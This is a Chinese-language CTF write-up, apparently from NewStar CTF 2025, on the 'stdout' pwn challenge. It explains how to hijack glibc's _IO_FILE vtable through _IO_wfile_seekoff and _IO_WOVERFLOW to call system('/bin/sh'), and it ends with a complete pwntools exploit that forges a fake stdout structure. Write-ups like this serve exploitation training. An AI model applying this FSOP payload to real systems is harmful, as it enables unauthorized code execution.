---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# stdout

<Container type='info'>

本题考查 `_IO_FILE` 结构体利用。
</Container>

开始做这道题之前，需要对 `_IO_FILE` 有基本认识，可以参考：

- [FILE 结构](https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/)
- [FILE 结构体漏洞利用：0x01 介绍](https://www.bilibili.com/video/BV14f421B7zt?spm_id_from=333.788.videopod.sections&vd_source=b005ec5af584b4ef1ded2a09167f88a7)
- [FILE 结构体漏洞利用：0x02 任意读与任意写](https://www.bilibili.com/video/BV18m421g7mZ?spm_id_from=333.788.videopod.sections&vd_source=b005ec5af584b4ef1ded2a09167f88a7)
- [FILE 结构体漏洞利用：0x03 FILE_plus 和 vtable](https://www.bilibili.com/video/BV14T421k7RJ?spm_id_from=333.788.videopod.sections&vd_source=b005ec5af584b4ef1ded2a09167f88a7)

首先大致分析程序。

![IDA 查看 stdout 逻辑](/assets/images/wp/2025/week5/stdout_1.png)

表面上看，这只是向 bss 段输入的逻辑，实际情况如下：

- `_bss_start` 是一个文件指针（FILE\*），它与输出流相关联，在 C 语言中，通常 `_bss_start` 会被初始化为标准输出流 `stdout`

随后程序打印 `stdout` 地址，并执行 `read(0, fp, 0xF0u);`，因此可以劫持 `stdout` 结构体。

简而言之，需要修改 vtable，使原本的 `_IO_file_xsputn` 变为 `_IO_wfile_seekoff`。
![vtable 劫持思路](/assets/images/wp/2025/week5/stdout_2.png)
查看相关源码：

```c
_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  off64_t result;
  off64_t delta, new_offset;
  long int count;

  if (mode == 0)
    return do_ftell_wide (fp);
......

  bool was_writing = ((fp->_wide_data->_IO_write_ptr
		       > fp->_wide_data->_IO_write_base)
		      || _IO_in_put_mode (fp));

  if (was_writing && _IO_switch_to_wget_mode (fp))
    return WEOF;
......
}
```

当满足 `fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base` 时，就会调用 `_IO_switch_to_wget_mode`。
![_IO_switch_to_wget_mode 调用点](/assets/images/wp/2025/week5/stdout_3.png)
![_IO_wfile_seekoff 源码](/assets/images/wp/2025/week5/stdout_4.png)
进入 `_IO_switch_to_wget_mode` 后，关键点在内部调用链。
![_IO_WOVERFLOW 调用链](/assets/images/wp/2025/week5/stdout_5.png)
继续查看源码：

```c
int
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
      ......
}
```

大小比较的逻辑体现在这里
![大小比较逻辑](/assets/images/wp/2025/week5/stdout_6.png)
当满足 `fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base` 时，会调用 `_IO_WOVERFLOW(fp)`。而 `_IO_WOVERFLOW` 实际取自 `_wide_data->_wide_vtable`，该地址可控。因此可以在这里布置 `system`，其参数来自 `_flags` 字段，将 `_flags` 字段设置为 `/bin/sh` 即可。

本题存在多种利用方式，这里给出其中一种调用链。

最后给出 EXP：

```python
from pwn import *

context(arch='amd64', log_level = 'debug',os = 'linux')
file='./FILE'
elf=ELF(file)
libc = ELF('./libc.so.6')

port=
ns=''
p = remote(ns,port)

# p = process(file)

# gdb.attach(p)
p.recvuntil('The file You are writing to is: ')
stdout = int(p.recv(14),16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']

payload = p64(0x68732f6e69622f) # _flags = rdi
payload += p64(0) # read ptr
payload += p64(1) # read end
payload += p64(0) # read base
payload += p64(2) # write base
payload += p64(3) # write ptr
payload += p64(0) # write end
payload += p64(0) # buf base
payload += p64(0) # buf end
payload += p64(0) # save base
payload += p64(0) # backup base
payload += p64(libc_base + libc.sym['system']) # save end = call addr = "rax2 + 0x18"
payload += p64(0) # _markers
payload += p64(0) # _chain
payload += p64(0) # _fileno
payload += p64(0) # _old_offset
payload += p64(0) # _cur_column
payload += p64(libc_base + 0x21B730) # _lock
payload += p64(0) # _offset
payload += p64(0) # _codecvx
payload += p64(stdout + 0x8) # _wfile_data rax1 "0xa0"
payload += p64(0) # _freers_list
payload += p64(0) # _freers_buf
payload += p64(0) # ____pad5
payload += p32(0) # _mode
payload += b'\x00'*20 # _unused2
payload += p64(libc_base + libc.sym['_IO_wfile_jumps'] + 0x10)
payload += p64(0) # padding
payload += p64(stdout + 0x40) # rax2

p.sendafter('now you can write something to the file',payload)

p.interactive()
```
